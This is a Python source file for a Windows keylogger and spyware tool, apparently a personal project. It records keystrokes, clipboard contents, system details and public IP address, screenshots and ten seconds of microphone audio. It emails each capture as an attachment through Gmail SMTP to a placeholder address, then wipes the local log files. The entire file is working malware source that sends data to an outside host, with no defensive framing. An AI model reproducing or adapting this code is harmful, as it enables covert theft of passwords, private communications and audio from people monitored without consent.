### IMPORTS ###

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

### DEFAULT VARIABLES ###
start_time = time.time()

keys_info = "key_log.txt"
system_info = "systeminfo.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screenshot_info = "ssimg.png"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 1

email_address = "xxx@gmail.com"
password = "xxx"

toaddr = "xxx@gmail.com"

file_path = "D:\\LoggerTest\\Project"
extend = "\\"
file_merge = file_path + extend

### EMAIL CONFIGURATION ###

def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "From PyCharm"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

### COMPUTER INFORMATION ###

def computer_info():
    with open(file_merge + system_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")

        except Exception:
            f.write("Max Query Error \n")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")
        f.write(".....................................................................")

### CLIPBOARD INFORMATION ###

def copy_clipboard():
    with open(file_merge + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied")

### AUDIO INFORMATION ###

def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_merge + audio_info, fs, myrecording)

#microphone()

### SCREEN CAPTURE INFORMATION ###

def screenshot():
    im = ImageGrab.grab()
    im.save(file_merge + screenshot_info)

#screenshot()

### TIMER BUILD ###

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration



while number_of_iterations < number_of_iterations_end:

    ### KEYLOGGER CODE ###

    print("Starting Keylogger")

    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_merge + keys_info, "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        print("End of Keylogger")
        print("Begin Processing")

        send_email(keys_info, file_merge + keys_info, toaddr)
        print("Sent Keylogging")

        with open(file_merge + keys_info, "w") as f:
            f.write("New Data: \n")
        print("Keylogger Erased")

        copy_clipboard()
        send_email(clipboard_info, file_merge + clipboard_info, toaddr)
        print("Sent Clipboard")

        with open(file_merge + clipboard_info, "w") as f:
            f.write("New Line: ")
        print("Clipboard Erased")

        computer_info()
        send_email(system_info, file_merge + system_info, toaddr)
        print("Sent Computer Info")

        with open(file_merge + system_info, "w") as f:
            f.write(" ")
        print("Computer Info Erased")

        screenshot()
        send_email(screenshot_info, file_merge + screenshot_info, toaddr)
        print("Screenshot sent")

        print("Recording Audio")
        microphone()
        send_email(audio_info, file_merge + audio_info, toaddr)
        print("Audio sent")

        copy_clipboard()
        print("Clipboard copied")

        computer_info()
        print("Computer Info copied")

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

        print("Code ran successfully: x")


    else :
        print("Failure")

end_time = time.time()
time_elapsed = (end_time - start_time)
print("Time Elapsed: ", time_elapsed)
